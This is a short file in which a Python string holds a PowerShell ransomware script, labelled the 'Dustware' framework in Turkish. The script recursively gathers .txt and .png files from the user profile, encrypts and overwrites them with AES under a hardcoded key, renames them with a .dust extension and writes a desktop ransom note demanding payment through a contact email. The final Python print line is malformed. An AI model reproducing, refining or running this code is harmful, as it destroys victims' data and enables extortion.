x = """

# Dustware Tek Parça Ransomware Framework (PS Obfuscated Style)

$__a = ".txt", ".png"
$__b = @()
gci $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
    if ($__a -contains $_.Extension.ToLower()) { $__b += $_.FullName }
}

$__k = [System.Text.Encoding]::UTF8.GetBytes("YkU7gH3kLp9sTmVzR2dJ5qW6mA0xZc8B")
$__i = @(0..15 | ForEach-Object { 0 })

foreach ($__f in $__b) {
    try {
        $__c = [System.IO.File]::ReadAllBytes($__f)
        $__e = [System.Security.Cryptography.Aes]::Create()
        $__e.Key = $__k
        $__e.IV = $__i
        $__e.Mode = "CBC"
        $__e.Padding = "PKCS7"
        $__x = $__e.CreateEncryptor().TransformFinalBlock($__c, 0, $__c.Length)
        [System.IO.File]::WriteAllBytes($__f, $__x)
        Rename-Item $__f ($__f + ".dust") -Force
    } catch {}
}

$__m = "All your files are encrypted.`nPay or lose them.`nContact: dust@protonmail.com"
$__r = "$env:USERPROFILE\Desktop\README_DUSTWARE.txt"
$__m | Out-File $__r -Encoding ASCII



"""
print(x")